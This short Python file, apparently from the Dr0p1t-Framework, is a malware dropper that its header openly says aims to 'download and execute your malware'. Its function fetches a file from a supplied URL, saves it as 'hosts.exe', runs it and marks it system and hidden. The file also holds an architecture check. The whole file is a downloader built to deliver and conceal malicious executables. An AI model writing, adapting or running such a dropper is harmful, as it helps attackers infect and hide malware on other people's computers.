#Written by: Karim shoair - D4Vinci ( Dr0p1t-Framework )
#This script aims to download and execute your malware (¯\_(ツ)_/¯)
#Start
from platform import architecture

def fire_things_up(url,arch="No"):
    x = urlretrieve(url,"hosts.exe")
    xx = subprocess.Popen("hosts.exe",shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
    xxx = subprocess.Popen("attrib +s +h hosts.exe",shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
    
    #check architecture
    if arch != "No":
        if architecture()[0][:2] == arch:
            raise SystemExit
